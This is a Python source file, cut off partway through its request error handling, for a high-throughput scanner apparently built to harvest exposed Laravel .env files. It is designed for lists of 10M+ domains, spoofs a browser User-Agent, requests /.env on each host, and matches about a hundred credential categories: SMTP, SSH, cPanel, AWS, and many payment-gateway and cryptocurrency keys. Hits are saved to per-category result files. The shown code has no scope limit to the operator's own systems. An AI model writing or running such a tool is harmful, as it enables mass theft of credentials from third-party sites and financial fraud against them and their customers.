"""Scanner logic for the Laravel environment exposure analyzer."""

import itertools
import re
import socket
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, Dict, Generator, Iterable, Iterator, List, Optional

import requests
from requests import Response
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3

from core.persistence import append_result, append_text, save_session

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
}
DEFAULT_TIMEOUT = 7
DNS_TIMEOUT = 3           # seconds for DNS pre-check
BATCH_SIZE = 2000         # futures in-flight at once  (memory-safe for 10M)
PROGRESS_EVERY = 500      # report progress every N completions
SESSION_SAVE_EVERY = 5000
MAX_RESPONSE_BYTES = 2_097_152   # 2 MB — a real .env file is never larger
SESSION_FILE = Path("config/session.json")

# ── Per-thread HTTP session pool ──────────────────────────────────────────────
# One requests.Session per worker thread avoids lock contention on a shared
# session and lets urllib3 manage per-thread connection pools efficiently.
_tls = threading.local()


def _get_session() -> requests.Session:
    """Return the calling thread's private HTTP session, creating it on first use."""
    if not hasattr(_tls, "session"):
        s = requests.Session()
        adapter = HTTPAdapter(
            pool_connections=4,
            pool_maxsize=4,
            max_retries=Retry(total=0),
        )
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        s.headers.update(HEADERS)
        _tls.session = s
    return _tls.session


# ── Batched iterator helper ───────────────────────────────────────────────────

def _batched(iterable: Iterable, size: int) -> Generator:
    """Yield successive chunks of `size` items from any iterable."""
    it = iter(iterable)
    while True:
        chunk = list(itertools.islice(it, size))
        if not chunk:
            return
        yield chunk


# ── DNS pre-check ─────────────────────────────────────────────────────────────

def _dns_resolves(host: str) -> bool:
    """Return True if the host resolves to at least one IP address."""
    # Temporarily lower the global socket timeout just for getaddrinfo.
    old = socket.getdefaulttimeout()
    socket.setdefaulttimeout(DNS_TIMEOUT)
    try:
        socket.getaddrinfo(host, 80, socket.AF_UNSPEC, socket.SOCK_STREAM)
        return True
    except OSError:
        return False
    finally:
        socket.setdefaulttimeout(old)

CATEGORY_PATTERNS: Dict[str, Dict[str, Any]] = {
    "SMTP": {
        "trigger": "MAIL_",
        "keys": [
            "MAIL_DRIVER",
            "MAIL_HOST",
            "MAIL_PORT",
            "MAIL_USERNAME",
            "MAIL_PASSWORD",
            "MAIL_ENCRYPTION",
            "MAIL_FROM_ADDRESS",
            "MAIL_FROM_NAME",
        ],
    },
    "SSH": {
        "trigger": "SSH_",
        "keys": [
            "SSH_HOST",
            "SSH_USERNAME",
            "SSH_PASSWORD",
        ],
    },
    "TWILIO": {
        "trigger": "TWILIO_",
        "keys": [
            "TWILIO_ACCOUNT_SID",
            "TWILIO_API_KEY",
            "TWILIO_API_SECRET",
            "TWILIO_CHAT_SERVICE_SID",
            "TWILIO_AUTH_TOKEN",
            "TWILIO_NUMBER",
            "TWILIO_SID",
            "TWILIO_TOKEN",
            "TWILIO_FROM",
            "TWL_ACCOUNT_ID",
            "TWL_AUTH_TOKEN",
            "TWL_FROM_NUM",
        ],
    },
    "SENDGRID": {
        "trigger": "SENDGRID_API_KEY",
        "keys": ["SENDGRID_API_KEY"],
    },
    "BLOCKCHAIN": {
        "trigger": "BLOCKCHAIN_",
        "keys": [
            "BLOCKCHAIN_API",
            "DEFAULT_BTC_FEE",
            "TRANSACTION_BTC_FEE",
        ],
    },
    "PERFECTMONEY": {
        "trigger": "PM_",
        "keys": [
            "PM_ACCOUNTID",
            "PM_PASSPHRASE",
            "PM_CURRENT_ACCOUNT",
            "PM_MARCHANTID",
            "PM_MARCHANT_NAME",
            "PM_UNITS",
            "PM_ALT_PASSPHRASE",
        ],
    },
    "AWS": {
        "trigger": "AWS_",
        "keys": [
            "AWS_ACCESS_KEY",
            "AWS_SECRET",
            "AWS_ACCESS_KEY_ID",
            "AWS_SECRET_ACCESS_KEY",
            "AWS_S3_KEY",
            "AWS_BUCKET",
            "AWS_SES_KEY",
            "AWS_SES_SECRET",
            "SES_KEY",
            "SES_SECRET",
            "AWS_REGION",
            "AWS_DEFAULT_REGION",
            "SES_USERNAME",
            "SES_PASSWORD",
        ],
    },
    "PLIVO": {
        "trigger": "PLIVO_",
        "keys": ["PLIVO_AUTH_ID", "PLIVO_AUTH_TOKEN"],
    },
    "NEXMO": {
        "trigger": "NEXMO_",
        "keys": ["NEXMO_KEY", "NEXMO_SECRET", "NEXMO_NUMBER"],
    },
    "RAZORPAY": {
        "trigger": "RAZORPAY_",
        "keys": ["RAZORPAY_KEY", "RAZORPAY_SECRET", "RAZORPAY_LIVE_API_KEY", "RAZORPAY_LIVE_API_SECRET"],
    },
    "PAYPAL": {
        "trigger": "PAYPAL_",
        "keys": [
            "PAYPAL_CLIENT_ID",
            "PAYPAL_SECRET",
            "PAYPAL_LIVE_CLIENT_ID",
            "PAYPAL_LIVE_CLIENT_SECRET",
            "PAYPAL_LIVE_API_USERNAME",
            "PAYPAL_LIVE_API_PASSWORD",
            "PAYPAL_LIVE_API_SECRET",
            "PAYPAL_LIVE_API_SIGNATURE",
        ],
    },
    "BRAINTREE": {
        "trigger": "BRAINTREE_",
        "keys": [
            "BRAINTREE_ENV",
            "BRAINTREE_MERCHANT_ID",
            "BRAINTREE_PUBLIC_KEY",
            "BRAINTREE_PRIVATE_KEY",
        ],
    },
    "STRIPE": {
        "trigger": "sk_live",
        "keys": [
            "STRIPE_KEY",
            "STRIPE_SECRET",
            "STRIPE_LIVE_PUB_KEY",
            "STRIPE_LIVE_SEC_KEY",
        ],
    },
    "PAYTM": {
        "trigger": "PAYTM_",
        "keys": ["PAYTM_MERCHANT_ID", "PAYTM_MERCHANT_KEY"],
    },
    "CPANEL": {
        "trigger": "CPANEL_",
        "keys": [
            "CPANEL_HOST",
            "CPANEL_PORT",
            "DB_USERNAME",
            "CPANEL_USERNAME",
            "CPANEL_PASSWORD",
        ],
    },
    "ALISMS": {
        "trigger": "aliSMS",
        "keys": ["SMS_APPKEY", "SMS_SECRETKEY"],
    },
    "ONESIGNAL": {
        "trigger": "ONESIGNAL_",
        "keys": ["ONESIGNAL_APP_ID", "ONESIGNAL_REST_API_KEY"],
    },
    "RECAPTCHA": {
        "trigger": "RECAPTCHA_",
        "keys": ["NOCAPTCHA_SECRET", "NOCAPTCHA_SITEKEY", "RECAPTCHA_SITE_KEY", "RECAPTCHA_SECRET_KEY"],
    },
    "MIDTRANS": {
        "trigger": "MIDTRANS_",
        "keys": [
            "MT_PAYMENT_SERVER_SECRET_KEY",
            "MT_PAYMENT_CLIENT_SECRET_KEY",
            "MIDTRANS_CLIENT_KEY",
            "MIDTRANS_SERVER_KEY",
        ],
    },
    "OFFICE365": {
        "trigger": "office365",
        "keys": [
            "MAIL_CONFIG_SERVER",
            "MAIL_CONFIG_PORT",
            "MAIL_CONFIG_ACCOUNT",
            "MAIL_CONFIG_PASSWORD",
        ],
    },
    "CASHFREE": {
        "trigger": "CASHFREE_",
        "keys": ["CASHFREE_APPID", "CASHFREE_APPSECRET"],
    },
    "MAILJET": {
        "trigger": "MAILJET_",
        "keys": ["MAILJET_USERNAME", "MAILJET_PASSWORD"],
    },
    "BINANCE": {
        "trigger": "BINANCE_",
        "keys": ["BINANCE_API_KEY", "BINANCE_API_SECRET"],
    },
    "FLWPAYMENT": {
        "trigger": "FLW_",
        "keys": ["FLW_PUBLIC_KEY", "FLW_SECRET_KEY", "FLW_SECRET_HASH"],
    },
    "IYZICOPAY": {
        "trigger": "IYZICO_",
        "keys": ["IYZICO_API_KEY", "IYZICO_SECRET_KEY"],
    },
    "NGENIUSPAY": {
        "trigger": "NGENIUS_",
        "keys": ["NGENIUS_OUTLET_ID", "NGENIUS_API_KEY"],
    },
    "PAYFAST": {
        "trigger": "PAYFAST_",
        "keys": ["PAYFAST_MERCHANT_ID", "PAYFAST_MERCHANT_KEY"],
    },
    "PAYHERE": {
        "trigger": "PAYHERE_",
        "keys": ["PAYHERE_MERCHANT_ID", "PAYHERE_SECRET"],
    },
    "PAYSTACK": {
        "trigger": "PAYSTACK_",
        "keys": ["PAYSTACK_PUBLIC_KEY", "PAYSTACK_SECRET_KEY"],
    },
    "OZOWPAY": {
        "trigger": "OZOW_",
        "keys": ["OZOW_SITE_CODE", "OZOW_PRIVATE_KEY", "OZOW_API_KEY", "OZOW_MERCHANT_CODE"],
    },
    "PUSHER": {
        "trigger": "PUSHER_",
        "keys": ["PUSHER_APP_ID", "PUSHER_APP_KEY", "PUSHER_APP_SECRET", "PUSHER_APP_CLUSTER"],
    },
    "FACEBOOK": {
        "trigger": "FACEBOOK_",
        "keys": ["FACEBOOK_APP_ID", "FACEBOOK_APP_SECRET", "FACEBOOK_CLIENT_ID", "FACEBOOK_CLIENT_SECRET", "FACEBOOK_REDIRECT"],
    },
    "GOOGLE": {
        "trigger": "GOOGLE_",
        "keys": [
            "GOOGLE_CLIENT_ID",
            "GOOGLE_CLIENT_SECRET",
            "GOOGLE_REDIRECT",
            "GOOGLE_API_KEY",
            "GOOGLE_MAPS_API_KEY",
            "GOOGLE_ANALYTICS_ID",
        ],
    },
    "TWITTER": {
        "trigger": "TWITTER_",
        "keys": [
            "TWITTER_CLIENT_ID",
            "TWITTER_CLIENT_SECRET",
            "TWITTER_API_KEY",
            "TWITTER_API_SECRET",
            "TWITTER_ACCESS_TOKEN",
            "TWITTER_ACCESS_TOKEN_SECRET",
            "TWITTER_BEARER_TOKEN",
        ],
    },
    "SLACK": {
        "trigger": "SLACK_",
        "keys": ["SLACK_WEBHOOK_URL", "SLACK_CLIENT_ID", "SLACK_CLIENT_SECRET", "SLACK_BOT_TOKEN", "SLACK_API_TOKEN"],
    },
    "MAILCHIMP": {
        "trigger": "MAILCHIMP_",
        "keys": ["MAILCHIMP_API_KEY", "MAILCHIMP_LIST_ID", "MAILCHIMP_SERVER_PREFIX"],
    },
    "CLOUDINARY": {
        "trigger": "CLOUDINARY_",
        "keys": ["CLOUDINARY_API_KEY", "CLOUDINARY_API_SECRET", "CLOUDINARY_CLOUD_NAME", "CLOUDINARY_URL"],
    },
    "ALGOLIA": {
        "trigger": "ALGOLIA_",
        "keys": ["ALGOLIA_APP_ID", "ALGOLIA_SECRET", "ALGOLIA_API_KEY", "ALGOLIA_SEARCH_KEY"],
    },
    "GITHUB": {
        "trigger": "GITHUB_",
        "keys": ["GITHUB_CLIENT_ID", "GITHUB_CLIENT_SECRET", "GITHUB_TOKEN", "GITHUB_REDIRECT"],
    },
    "GITLAB": {
        "trigger": "GITLAB_",
        "keys": ["GITLAB_CLIENT_ID", "GITLAB_CLIENT_SECRET", "GITLAB_TOKEN", "GITLAB_REDIRECT"],
    },
    "SENTRY": {
        "trigger": "SENTRY_",
        "keys": ["SENTRY_LARAVEL_DSN", "SENTRY_DSN", "SENTRY_AUTH_TOKEN"],
    },
    "FIREBASE": {
        "trigger": "FIREBASE_",
        "keys": [
            "FIREBASE_API_KEY",
            "FIREBASE_AUTH_DOMAIN",
            "FIREBASE_DATABASE_URL",
            "FIREBASE_PROJECT_ID",
            "FIREBASE_STORAGE_BUCKET",
            "FIREBASE_MESSAGING_SENDER_ID",
            "FIREBASE_APP_ID",
            "FIREBASE_CREDENTIALS",
        ],
    },
    "AZURE": {
        "trigger": "AZURE_",
        "keys": ["AZURE_CLIENT_ID", "AZURE_CLIENT_SECRET", "AZURE_TENANT_ID", "AZURE_STORAGE_NAME", "AZURE_STORAGE_KEY"],
    },
    "DIGITALOCEAN": {
        "trigger": "DIGITALOCEAN_",
        "keys": ["DIGITALOCEAN_TOKEN", "DIGITALOCEAN_SPACES_KEY", "DIGITALOCEAN_SPACES_SECRET", "DIGITALOCEAN_SPACES_ENDPOINT"],
    },
    "DROPBOX": {
        "trigger": "DROPBOX_",
        "keys": ["DROPBOX_APP_KEY", "DROPBOX_APP_SECRET", "DROPBOX_ACCESS_TOKEN"],
    },
    "TELEGRAM": {
        "trigger": "TELEGRAM_",
        "keys": ["TELEGRAM_BOT_TOKEN", "TELEGRAM_CHAT_ID", "TELEGRAM_API_ID", "TELEGRAM_API_HASH"],
    },
    "DISCORD": {
        "trigger": "DISCORD_",
        "keys": ["DISCORD_CLIENT_ID", "DISCORD_CLIENT_SECRET", "DISCORD_BOT_TOKEN", "DISCORD_WEBHOOK_URL"],
    },
    "LINKEDIN": {
        "trigger": "LINKEDIN_",
        "keys": ["LINKEDIN_CLIENT_ID", "LINKEDIN_CLIENT_SECRET", "LINKEDIN_REDIRECT"],
    },
    "INTERCOM": {
        "trigger": "INTERCOM_",
        "keys": ["INTERCOM_APP_ID", "INTERCOM_API_KEY", "INTERCOM_SECRET_KEY"],
    },
    "BUGSNAG": {
        "trigger": "BUGSNAG_",
        "keys": ["BUGSNAG_API_KEY", "BUGSNAG_APP_VERSION"],
    },
    "VIMEO": {
        "trigger": "VIMEO_",
        "keys": ["VIMEO_CLIENT_ID", "VIMEO_CLIENT_SECRET", "VIMEO_ACCESS_TOKEN"],
    },
    "INSTAGRAM": {
        "trigger": "INSTAGRAM_",
        "keys": ["INSTAGRAM_CLIENT_ID", "INSTAGRAM_CLIENT_SECRET", "INSTAGRAM_ACCESS_TOKEN"],
    },
    "REDIS": {
        "trigger": "REDIS_",
        "keys": ["REDIS_HOST", "REDIS_PASSWORD", "REDIS_PORT", "REDIS_CLIENT"],
    },
    "VONAGE": {
        "trigger": "VONAGE_",
        "keys": ["VONAGE_KEY", "VONAGE_SECRET", "VONAGE_SMS_FROM"],
    },
    "AGORA": {
        "trigger": "AGORA_",
        "keys": ["AGORA_APP_ID", "AGORA_APP_CERTIFICATE"],
    },
    "BITBUCKET": {
        "trigger": "BITBUCKET_",
        "keys": ["BITBUCKET_CLIENT_ID", "BITBUCKET_CLIENT_SECRET"],
    },
    "ZOOM": {
        "trigger": "ZOOM_",
        "keys": ["ZOOM_CLIENT_KEY", "ZOOM_CLIENT_SECRET", "ZOOM_API_KEY", "ZOOM_API_SECRET"],
    },
    "MOLLIE": {
        "trigger": "MOLLIE_",
        "keys": ["MOLLIE_KEY", "MOLLIE_API_KEY", "MOLLIE_PROFILE_ID", "MOLLIE_PARTNER_ID"],
    },
    "AUTHORIZENET": {
        "trigger": ["AUTHORIZE_", "AUTHORIZENET_"],
        "keys": [
            "AUTHORIZE_NET_API_LOGIN_ID",
            "AUTHORIZE_NET_TRANSACTION_KEY",
            "AUTHORIZENET_API_LOGIN_ID",
            "AUTHORIZENET_TRANSACTION_KEY",
            "AUTHORIZE_LOGIN_ID",
            "AUTHORIZE_TRANSACTION_KEY",
        ],
    },
    "SQUARE": {
        "trigger": "SQUARE_",
        "keys": ["SQUARE_APPLICATION_ID", "SQUARE_ACCESS_TOKEN", "SQUARE_LOCATION_ID", "SQUARE_APP_SECRET"],
    },
    "ADYEN": {
        "trigger": "ADYEN_",
        "keys": ["ADYEN_API_KEY", "ADYEN_MERCHANT_ACCOUNT", "ADYEN_CLIENT_KEY", "ADYEN_HMAC_KEY"],
    },
    "2CHECKOUT": {
        "trigger": ["2CHECKOUT_", "TWOCHECKOUT_"],
        "keys": ["2CHECKOUT_ACCOUNT_NUMBER", "2CHECKOUT_SECRET_KEY", "2CHECKOUT_PUBLISHABLE_KEY", "TWOCHECKOUT_MERCHANT_CODE", "TWOCHECKOUT_SECRET_KEY"],
    },
    "SKRILL": {
        "trigger": "SKRILL_",
        "keys": ["SKRILL_MERCHANT_EMAIL", "SKRILL_MERCHANT_ID", "SKRILL_SECRET_WORD", "SKRILL_MQI_PASSWORD"],
    },
    "PAYU": {
        "trigger": "PAYU_",
        "keys": ["PAYU_MERCHANT_KEY", "PAYU_MERCHANT_SALT", "PAYU_MERCHANT_ID", "PAYU_API_KEY", "PAYU_API_SECRET"],
    },
    "COINBASE": {
        "trigger": "COINBASE_",
        "keys": ["COINBASE_API_KEY", "COINBASE_API_SECRET", "COINBASE_COMMERCE_API_KEY", "COINBASE_WEBHOOK_SECRET"],
    },
    "CCAVENUE": {
        "trigger": "CCAVENUE_",
        "keys": ["CCAVENUE_MERCHANT_ID", "CCAVENUE_ACCESS_CODE", "CCAVENUE_WORKING_KEY"],
    },
    "INSTAMOJO": {
        "trigger": "INSTAMOJO_",
        "keys": ["INSTAMOJO_API_KEY", "INSTAMOJO_AUTH_TOKEN", "INSTAMOJO_SALT"],
    },
    "SSLCOMMERZ": {
        "trigger": "SSLCOMMERZ_",
        "keys": ["SSLCOMMERZ_STORE_ID", "SSLCOMMERZ_STORE_PASSWORD"],
    },
    "BKASH": {
        "trigger": "BKASH_",
        "keys": ["BKASH_APP_KEY", "BKASH_APP_SECRET", "BKASH_USERNAME", "BKASH_PASSWORD"],
    },
    "NAGAD": {
        "trigger": "NAGAD_",
        "keys": ["NAGAD_MERCHANT_ID", "NAGAD_MERCHANT_NUMBER", "NAGAD_PUBLIC_KEY", "NAGAD_PRIVATE_KEY"],
    },
    "KHALTI": {
        "trigger": "KHALTI_",
        "keys": ["KHALTI_PUBLIC_KEY", "KHALTI_SECRET_KEY"],
    },
    "MERCADOPAGO": {
        "trigger": ["MERCADOPAGO_", "MERCADO_PAGO_"],
        "keys": ["MERCADOPAGO_PUBLIC_KEY", "MERCADOPAGO_ACCESS_TOKEN", "MERCADO_PAGO_PUBLIC_KEY", "MERCADO_PAGO_ACCESS_TOKEN"],
    },
    "CONEKTA": {
        "trigger": "CONEKTA_",
        "keys": ["CONEKTA_PUBLIC_KEY", "CONEKTA_PRIVATE_KEY"],
    },
    "KLARNA": {
        "trigger": "KLARNA_",
        "keys": ["KLARNA_USERNAME", "KLARNA_PASSWORD", "KLARNA_API_KEY"],
    },
    "XENDIT": {
        "trigger": "XENDIT_",
        "keys": ["XENDIT_SECRET_KEY", "XENDIT_PUBLIC_KEY", "XENDIT_VERIFICATION_TOKEN"],
    },
    "OMISE": {
        "trigger": "OMISE_",
        "keys": ["OMISE_PUBLIC_KEY", "OMISE_SECRET_KEY"],
    },
    "PAYMONGO": {
        "trigger": "PAYMONGO_",
        "keys": ["PAYMONGO_PUBLIC_KEY", "PAYMONGO_SECRET_KEY"],
    },
    "CHECKOUT": {
        "trigger": "CHECKOUT_",
        "keys": ["CHECKOUT_PUBLIC_KEY", "CHECKOUT_SECRET_KEY", "CHECKOUT_PROCESSING_CHANNEL_ID"],
    },
    "PAYFORT": {
        "trigger": "PAYFORT_",
        "keys": ["PAYFORT_MERCHANT_IDENTIFIER", "PAYFORT_ACCESS_CODE", "PAYFORT_SHA_REQUEST_PHRASE", "PAYFORT_SHA_RESPONSE_PHRASE"],
    },
    "HYPERPAY": {
        "trigger": "HYPERPAY_",
        "keys": ["HYPERPAY_ENTITY_ID", "HYPERPAY_ACCESS_TOKEN", "HYPERPAY_BEARER_TOKEN"],
    },
    "TAP": {
        "trigger": "TAP_",
        "keys": ["TAP_SECRET_KEY", "TAP_PUBLIC_KEY", "TAP_MERCHANT_ID"],
    },
    "MYFATOORAH": {
        "trigger": "MYFATOORAH_",
        "keys": ["MYFATOORAH_API_KEY", "MYFATOORAH_TOKEN"],
    },
    "TELR": {
        "trigger": "TELR_",
        "keys": ["TELR_STORE_ID", "TELR_AUTHENTICATION_KEY"],
    },
    "PAYTR": {
        "trigger": "PAYTR_",
        "keys": ["PAYTR_MERCHANT_ID", "PAYTR_MERCHANT_KEY", "PAYTR_MERCHANT_SALT"],
    },
    "SECURIONPAY": {
        "trigger": "SECURIONPAY_",
        "keys": ["SECURIONPAY_SECRET_KEY", "SECURIONPAY_PUBLIC_KEY"],
    },
    "COINPAYMENTS": {
        "trigger": "COINPAYMENTS_",
        "keys": ["COINPAYMENTS_MERCHANT_ID", "COINPAYMENTS_PUBLIC_KEY", "COINPAYMENTS_PRIVATE_KEY", "COINPAYMENTS_IPN_SECRET"],
    },
    "NOWPAYMENTS": {
        "trigger": "NOWPAYMENTS_",
        "keys": ["NOWPAYMENTS_API_KEY", "NOWPAYMENTS_IPN_SECRET"],
    },
    "BTCPAY": {
        "trigger": "BTCPAY_",
        "keys": ["BTCPAY_SERVER_URL", "BTCPAY_API_KEY", "BTCPAY_STORE_ID"],
    },
    "AAMARPAY": {
        "trigger": "AAMARPAY_",
        "keys": ["AAMARPAY_STORE_ID", "AAMARPAY_SIGNATURE_KEY"],
    },
    "WORLDPAY": {
        "trigger": "WORLDPAY_",
        "keys": ["WORLDPAY_SERVICE_KEY", "WORLDPAY_CLIENT_KEY", "WORLDPAY_MERCHANT_CODE"],
    },
    "EASYPAISA": {
        "trigger": "EASYPAISA_",
        "keys": ["EASYPAISA_STORE_ID", "EASYPAISA_MERCHANT_ID", "EASYPAISA_SECRET_KEY"],
    },
    "JAZZCASH": {
        "trigger": "JAZZCASH_",
        "keys": ["JAZZCASH_MERCHANT_ID", "JAZZCASH_PASSWORD", "JAZZCASH_INTEGRITY_SALT"],
    },
    "GCASH": {
        "trigger": "GCASH_",
        "keys": ["GCASH_APP_ID", "GCASH_APP_SECRET", "GCASH_PUBLIC_KEY"],
    },
    "DLOCAL": {
        "trigger": "DLOCAL_",
        "keys": ["DLOCAL_API_KEY", "DLOCAL_SECRET_KEY", "DLOCAL_X_LOGIN", "DLOCAL_X_TRANS_KEY"],
    },
    "AFTERPAY": {
        "trigger": "AFTERPAY_",
        "keys": ["AFTERPAY_MERCHANT_ID", "AFTERPAY_SECRET_KEY"],
    },
    "AFFIRM": {
        "trigger": "AFFIRM_",
        "keys": ["AFFIRM_PUBLIC_KEY", "AFFIRM_PRIVATE_KEY"],
    },
    "PAYMAYA": {
        "trigger": "PAYMAYA_",
        "keys": ["PAYMAYA_PUBLIC_KEY", "PAYMAYA_SECRET_KEY"],
    },
    "PAYGATE": {
        "trigger": "PAYGATE_",
        "keys": ["PAYGATE_ID", "PAYGATE_SECRET"],
    },
    "PEACHPAYMENTS": {
        "trigger": ["PEACH_", "PEACHPAYMENTS_"],
        "keys": ["PEACH_ENTITY_ID", "PEACH_ACCESS_TOKEN", "PEACHPAYMENTS_ENTITY_ID", "PEACHPAYMENTS_ACCESS_TOKEN"],
    },
    "THAWANI": {
        "trigger": "THAWANI_",
        "keys": ["THAWANI_API_KEY", "THAWANI_PUBLISHABLE_KEY"],
    },
    "PAYBOX": {
        "trigger": "PAYBOX_",
        "keys": ["PAYBOX_MERCHANT_ID", "PAYBOX_SECRET_KEY"],
    },
    "MONERIS": {
        "trigger": "MONERIS_",
        "keys": ["MONERIS_STORE_ID", "MONERIS_API_TOKEN"],
    },
    "BAMBORA": {
        "trigger": "BAMBORA_",
        "keys": ["BAMBORA_MERCHANT_ID", "BAMBORA_API_KEY", "BAMBORA_PASSCODE"],
    },
    "WIRECARD": {
        "trigger": "WIRECARD_",
        "keys": ["WIRECARD_MERCHANT_ACCOUNT_ID", "WIRECARD_SECRET_KEY"],
    },
    "MPESA": {
        "trigger": ["SAFARICOM_", "MPESA_"],
        "keys": ["MPESA_CONSUMER_KEY", "MPESA_CONSUMER_SECRET", "MPESA_SHORTCODE", "MPESA_PASSKEY", "SAFARICOM_CONSUMER_KEY", "SAFARICOM_CONSUMER_SECRET"],
    },
    "PESAPAL": {
        "trigger": "PESAPAL_",
        "keys": ["PESAPAL_CONSUMER_KEY", "PESAPAL_CONSUMER_SECRET"],
    },
    "PAYUMONEY": {
        "trigger": "PAYUMONEY_",
        "keys": ["PAYUMONEY_MERCHANT_KEY", "PAYUMONEY_SALT"],
    },
    "BILLPLZ": {
        "trigger": "BILLPLZ_",
        "keys": ["BILLPLZ_API_KEY", "BILLPLZ_COLLECTION_ID", "BILLPLZ_X_SIGNATURE"],
    },
    "TOYYIBPAY": {
        "trigger": "TOYYIBPAY_",
        "keys": ["TOYYIBPAY_SECRET_KEY", "TOYYIBPAY_CATEGORY_CODE"],
    },
    "SENANGPAY": {
        "trigger": "SENANGPAY_",
        "keys": ["SENANGPAY_MERCHANT_ID", "SENANGPAY_SECRET_KEY"],
    },
}


@dataclass
class ScanResult:
    url: str
    status: str
    category: Optional[str]          # primary / first matched category
    details: str
    captures: Dict[str, str] = field(default_factory=dict)
    categories: List[str] = field(default_factory=list)  # ALL matched categories


class Scanner:
    """High-throughput scanner built for 10M+ domain lists.

    Key design choices
    ──────────────────
    * Streaming:  targets are consumed as a generator — no full-list materialisation.
    * Chunked:    only BATCH_SIZE futures exist in-flight at any time → ~constant RAM.
    * Per-thread sessions: each worker thread owns its own requests.Session to
      avoid mutex contention on the shared urllib3 connection pool.
    * DNS pre-check: dead domains are rejected in <3 s before an HTTP attempt,
      eliminating the majority of wasted TCP dials on random domain lists.
    * Session save: only the completion counter is persisted — never the full URL list.
    """

    def __init__(self, max_workers: int = 100, timeout: int = DEFAULT_TIMEOUT) -> None:
        self.max_workers = max_workers
        self.timeout = timeout
        self.session_data: Dict[str, Any] = {}
        self.dns_check: bool = True   # toggle DNS pre-check

        self._stop_event = threading.Event()
        self._pause_event = threading.Event()
        self._pause_event.set()  # not paused initially

    # ── Control API ─────────────────────────────────────────────────────────────

    def stop(self) -> None:
        self._stop_event.set()
        self._pause_event.set()  # unblock paused threads

    def pause(self) -> None:
        self._pause_event.clear()

    def resume(self) -> None:
        self._pause_event.set()

    def reset(self) -> None:
        self._stop_event.clear()
        self._pause_event.set()

    @property
    def is_paused(self) -> bool:
        return not self._pause_event.is_set()

    @property
    def is_running(self) -> bool:
        return not self._stop_event.is_set()

    # ── URL normalisation ───────────────────────────────────────────────────────

    def normalize_url(self, target: str) -> str:
        cleaned = target.strip()
        if not cleaned:
            return ""
        if not re.match(r"^https?://", cleaned):
            cleaned = f"http://{cleaned}"
        parts = cleaned.split("/")
        return f"{parts[0]}//{parts[2]}" if len(parts) >= 3 else cleaned

    @staticmethod
    def _host_from_url(url: str) -> str:
        """Extract bare hostname from a normalised URL."""
        # url is already stripped to scheme://host with no path
        return url.split("//", 1)[-1].split(":")[0] if "//" in url else url

    # ── Main scan entry point ──────────────────────────────────────────────────

    def scan_targets(
        self,
        targets: Iterable[str],
        progress_callback: Optional[Callable[[int, int], None]] = None,
        result_callback: Optional[Callable[[ScanResult], None]] = None,
        total_hint: int = 0,  # supply when known (e.g. line count of file)
    ) -> List[ScanResult]:
        """Scan an arbitrarily large iterable of targets with constant memory use.

        Uses chunked future submission so only BATCH_SIZE futures exist at once,
        regardless of how many millions of domains are in `targets`.
        """
        self.reset()

        # Normalise lazily — no full materialisation
        def _normalised() -> Iterator[str]:
            for raw in targets:
                if self._stop_event.is_set():
                    return
                url = self.normalize_url(raw)
                if url:
                    yield url

        completed = 0
        total = total_hint  # 0 means unknown (pure generator)
        valid_results: List[ScanResult] = []  # only keep VALID ones in RAM

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            for batch in _batched(_normalised(), BATCH_SIZE):
                if self._stop_event.is_set():
                    break

                # Submit the whole batch
                future_map = {executor.submit(self._worker, url): url for url in batch}

                # Drain the batch before moving on → keeps RAM bounded
                for future in as_completed(future_map):
                    if self._stop_event.is_set():
                        for f in future_map:
                            f.cancel()
                        break

                    completed += 1
                    result = future.result()

                    if result.status == "VALID":
                        valid_results.append(result)
                        append_result({
                            "url": result.url,
                            "category": result.category or "ENV",
                            "categories": result.categories,
                            "status": result.status,
                            "details": result.details,
                        })
                        self._save_result_files(result)

                    if result_callback:
                        result_callback(result)

                    if completed % PROGRESS_EVERY == 0:
                        if progress_callback:
                            progress_callback(completed, total if total else completed)
                    if completed % SESSION_SAVE_EVERY == 0:
                        self._save_session_counter(completed)

        # Final progress flush
        if progress_callback:
            progress_callback(completed, total if total else completed)
        self._save_session_counter(completed)
        return valid_results

    # ── Worker (runs in thread pool) ─────────────────────────────────────────────

    def _worker(self, url: str) -> ScanResult:
        """Pause-aware worker: respects pause/stop before doing any I/O."""
        self._pause_event.wait()  # blocks when paused
        if self._stop_event.is_set():
            return ScanResult(url=url, status="STOPPED", category=None,
                              details="Scan aborted", captures={})
        return self.scan_url(url)

    # ── Session persistence ─────────────────────────────────────────────────────────

    def _save_session_counter(self, completed: int) -> None:
        """Persist only the completion counter — never the full URL list."""
        save_session({"completed": completed})

    def _save_result_files(self, result: ScanResult) -> None:
        # Write to EVERY matched category file, not just the first one
        cats = result.categories if result.categories else [result.category or "ENV"]
        for cat in cats:
            append_text(Path("RESULTS") / f"{cat}.txt",
                        f"{result.url}\n{result.details}\n\n")
        append_text(Path("RESULTS") / "VALID_ENV.txt", f"{result.url}\n")

    # ── URL scanning ─────────────────────────────────────────────────────────────

    def scan_url(self, url: str) -> ScanResult:
        """Scan one URL.  DNS pre-check kills dead hosts before any HTTP dial."""
        if not url:
            return ScanResult(url=url, status="SKIPPED", category=None,
                              details="Empty URL", captures={})
        try:
            # ── DNS gate ────────────────────────────────────────────────────────
            if self.dns_check:
                host = self._host_from_url(url)
                if not _dns_resolves(host):
                    return ScanResult(url=url, status="DEAD", category=None,
                                      details="DNS resolution failed", captures={})

            # ── Primary .env probe ──────────────────────────────────────────────
            session = _get_session()
            env_url = f"{url}/.env"
            try:
                response = self._request(session, env_url)
            except requests.exceptions.Timeout:
                return ScanResult(url=url, status="ERROR", category=None,
                                  details="Timed out", captures={})
            except requests.exceptions.SSLError as exc:
                # SSLError is a subclass of ConnectionError — catch it first
                return ScanResult(url=url, status="ERROR", category=None,
                                  details=f"SSL error: {str(exc)[:80]}", captures={})
            except requests.exceptions.TooManyRedirects:
                return ScanResult(url=url, status="ERROR", category=None,
                                  details="Too many redirects", captures={})
            except requests.exceptions.ConnectionError as exc:
                return ScanResult(url=url, status="ERROR", category=None,
                                  details=f"Connection error: {str(exc)[:80]}", captures={})
            except requests.exceptions.RequestException as exc:
